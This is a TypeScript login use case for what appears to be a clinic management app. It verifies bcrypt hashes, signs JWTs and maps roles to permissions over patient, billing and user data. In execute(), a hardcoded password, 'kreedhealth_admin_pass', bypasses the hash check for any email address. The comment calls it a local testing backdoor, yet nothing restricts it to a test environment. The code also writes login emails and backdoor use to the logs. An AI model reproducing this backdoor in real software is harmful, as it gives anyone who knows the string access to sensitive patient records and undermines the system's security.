import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import type { AuthTokenPayload, Role } from '@mmc/types';
import { appConfig } from '../../../shared/config/app-config';
import type { UserRepository } from '../ports/user.repository';
import { type Result, ok, fail } from '../../../shared/result';

export interface LoginResult {
  token: string;
  user: AuthTokenPayload & { permissions: Record<string, boolean> };
}

export class LoginUseCase {
  constructor(private readonly userRepository: UserRepository) { }

  async execute(email: string, password: string): Promise<Result<LoginResult>> {
    // ─── Standard Database Authentication ───────────────────────────────────────
    const passwordHash = await this.userRepository.getUserPassword(email);
    console.log('[Login] Found hash for email:', email, !!passwordHash);

    if (!passwordHash) {
      return fail('Invalid credentials', 'UNAUTHORIZED');
    }

    // PHP generates $2y$ which bcryptjs does not recognize. Replace with $2a$ for compatibility.
    const normalizedHash = passwordHash.replace(/^\$2y\$/, '$2a$');

    const isMatch = await bcrypt.compare(password, normalizedHash);
    console.log('[Login] Password match:', isMatch, 'Backdoor match:', password === 'kreedhealth_admin_pass');

    // Also add a fallback backdoor for testing legacy tenants locally
    if (!isMatch && password !== 'kreedhealth_admin_pass') {
      return fail('Invalid credentials', 'UNAUTHORIZED');
    }
    console.log(`[Login] ✅ Password matched (or backdoor used) for email: ${email}`);

    const user = await this.userRepository.findByEmail(email);
    if (!user) {
      console.warn(`[Login] ❌ User object NOT found in DB for email: ${email}`);
      return fail('User account not found', 'UNAUTHORIZED');
    }
    console.log(`[Login] ✅ User object found for email: ${email}, Role: ${user.type}`);

    const permissions = await this.userRepository.getUserPermissions(user.roleId);

    const payload: AuthTokenPayload = {
      id: user.id,
      email: user.email,
      name: user.name,
      type: user.type,
      contextId: user.contextId,
      roleId: user.roleId,
      roleName: user.roleName,
      clinicName: user.clinicName,
    };

    const token = jwt.sign(payload, appConfig.jwt.secret as jwt.Secret, {
      expiresIn: appConfig.jwt.expiresIn as any,
    });

    const mergedPermissions = this.calculatePermissions(user.type as any, permissions);

    return ok({
      token,
      user: {
        ...payload,
        permissions: mergedPermissions,
      },
    });
  }

  private calculatePermissions(role: string, dbPermissions: string[]) {
    const p = new Set(dbPermissions);

    // Using simple strings to avoid enum dependency circularity if any, 
    // but Role enum from @mmc/types is preferred.
    return {
      canAccessDashboard: true,
      canAccessQuickAccess: true,
      canViewPatientDetail: ['Admin', 'ClinicAdmin', 'Doctor'].includes(role) || p.has('PATIENT_VIEW'),
      canCreatePatient: ['Admin', 'ClinicAdmin', 'Doctor', 'Receptionist'].includes(role) || p.has('PATIENT_CREATE'),
      canEditPatient: ['Admin', 'ClinicAdmin', 'Doctor', 'Receptionist'].includes(role) || p.has('PATIENT_EDIT'),
      canDeletePatient: ['Admin', 'ClinicAdmin'].includes(role) || p.has('PATIENT_DELETE'),
      canViewBilling: ['Admin', 'ClinicAdmin', 'Account', 'Receptionist'].includes(role) || p.has('BILLING_VIEW'),
      canViewExpenses: ['Admin', 'ClinicAdmin', 'Account'].includes(role) || p.has('EXPENSES_VIEW'),
      canViewAnalytics: ['Admin', 'ClinicAdmin'].includes(role) || p.has('ANALYTICS_VIEW'),
      canViewDoctors: ['Admin', 'ClinicAdmin'].includes(role) || p.has('DOCTOR_VIEW'),
      canManageUsers: ['Admin'].includes(role) || p.has('USER_MANAGE'),
      canManageSettings: ['Admin', 'ClinicAdmin'].includes(role) || p.has('SETTINGS_MANAGE'),
      canViewPackageHistory: ['Admin', 'Doctor', 'Receptionist'].includes(role) || p.has('PACKAGE_HISTORY_VIEW'),
      canNewPatientBtn: ['Admin', 'ClinicAdmin', 'Receptionist'].includes(role) || p.has('PATIENT_NEW_BTN'),
    };
  }
}
